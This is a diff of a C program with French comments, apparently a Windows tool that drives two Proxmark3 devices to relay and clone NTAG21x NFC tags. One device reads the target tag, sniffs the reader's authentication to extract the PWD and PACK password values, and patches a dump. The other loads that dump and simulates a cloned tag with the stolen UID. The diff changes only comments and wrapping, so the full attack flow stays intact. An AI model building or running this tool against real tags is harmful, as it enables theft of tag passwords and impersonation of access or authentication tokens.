@@ -1,15 +1,3 @@
-cat << 'EOF' > sim.c
-/*
- * ntag_relay.c
- *
- * Orchestrateur relay NTAG 21x :
- *   MOLE  : lit le tag, sniffe PWD/PACK via trace
- *   PROXY : eload le dump modifié, lance la sim
- *
- * Dépendances : Windows (CreateProcess, OVERLAPPED serial I/O)
- * Compiler : cl ntag_relay.c ou gcc -o ntag_relay ntag_relay.c
- */
-
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -20,9 +8,9 @@ cat << 'EOF' > sim.c
 #define PROXY_PORT  "COM9"
 #define MOLE_PORT   "COM10"
 #define PM3_PATH    "client\\proxmark3.exe"
-#define DUMP_FILE   "ntag_template.bin"   /* dump binaire de base à modifier */
+#define DUMP_FILE   "ntag_template.bin"   
 #define BAUD        115200
-#define CMD_TIMEOUT 15000  /* ms max pour attendre une réponse PM3 */
+#define CMD_TIMEOUT 15000  // ms max pour attendre une réponse PM3
 
 /* Pages NTAG215 (adapter si NTAG213/216) */
 #define NTAG215_TOTAL_PAGES  135
@@ -215,19 +203,19 @@ int main(void) {
 
     printf("=== NTAG 21x Relay ===\n\n");
 
-    /* ── 1. Ouvrir MOLE ── */
+    /* ──  Ouvrir MOLE ── */
     printf("[*] Connexion MOLE (%s)...\n", MOLE_PORT);
     HANDLE mole = serial_open(MOLE_PORT, BAUD);
     if (mole == INVALID_HANDLE_VALUE) return 1;
 
-    /* ── 2. Ouvrir PROXY ── */
+    /* ──  Ouvrir PROXY ── */
     printf("[*] Connexion PROXY (%s)...\n", PROXY_PORT);
     HANDLE proxy = serial_open(PROXY_PORT, BAUD);
     if (proxy == INVALID_HANDLE_VALUE) { CloseHandle(mole); return 1; }
 
     Sleep(1000); /* laisser les PM3 s'initialiser */
 
-    /* ── 3. MOLE : lire le tag ── */
+    /* ──  MOLE : lire le tag ── */
     printf("\n[*] MOLE : lecture du tag...\n");
     serial_write(mole, "hf mfu reader");
     if (!serial_read_until(mole, "pm3 -->", buf, sizeof(buf), CMD_TIMEOUT)) {
@@ -244,7 +232,7 @@ int main(void) {
     for (int i = 0; i < tag.uid_len; i++) printf("%02X ", tag.uid[i]);
     printf("\n");
 
-    /* ── 4. MOLE : sniffer l'auth ── */
+    /* ── MOLE : sniffer l'auth ── */
     printf("\n[*] MOLE : sniff en cours — approcher le lecteur du tag...\n");
     serial_write(mole, "hf 14a sniff -c -r");
 
@@ -256,7 +244,7 @@ int main(void) {
     serial_write(mole, "");  /* ligne vide = stop sniff sur PM3 */
     Sleep(500);
 
-    /* ── 5. MOLE : analyser la trace ── */
+    /* ── MOLE : analyser la trace ── */
     printf("\n[*] MOLE : analyse de la trace...\n");
     serial_write(mole, "trace list -t mfu");
     if (!serial_read_until(mole, "pm3 -->", buf, sizeof(buf), CMD_TIMEOUT)) {
@@ -274,11 +262,11 @@ int main(void) {
            tag.pwd[0], tag.pwd[1], tag.pwd[2], tag.pwd[3]);
     printf("[+] PACK : %02X %02X\n", tag.pack[0], tag.pack[1]);
 
-    /* ── 6. Patcher le dump ── */
+    /* ── Patcher le dump ── */
     printf("\n[*] Patch du dump '%s'...\n", DUMP_FILE);
     if (!patch_dump(DUMP_FILE, &tag)) goto cleanup;
 
-    /* ── 7. PROXY : envoyer le dump via eload ── */
+    /* ── PROXY : envoyer le dump via eload ── */
     printf("\n[*] PROXY : chargement du dump...\n");
     {
         char cmd[256];
@@ -291,14 +279,14 @@ int main(void) {
         printf("[proxy] %s\n", buf);
     }
 
-    /* ── 8. PROXY : vérifier pages PWD/PACK ── */
+    /* ── PROXY : vérifier pages PWD/PACK ── */
     printf("\n[*] PROXY : vérification pages config...\n");
     serial_write(proxy, "hf mfu eview");
     serial_read_until(proxy, "pm3 -->", buf, sizeof(buf), CMD_TIMEOUT);
     /* Juste afficher, la vérification visuelle suffit */
     printf("[proxy eview]\n%s\n", buf);
 
-    /* ── 9. PROXY : lancer la simulation ── */
+    /* ── PROXY : lancer la simulation ── */
     printf("\n[*] PROXY : démarrage simulation NTAG215 (type 7)...\n");
     {
         char uid_str[32] = {0};
@@ -325,4 +313,3 @@ cleanup:
     CloseHandle(proxy);
     return 0;
 }
-EOF
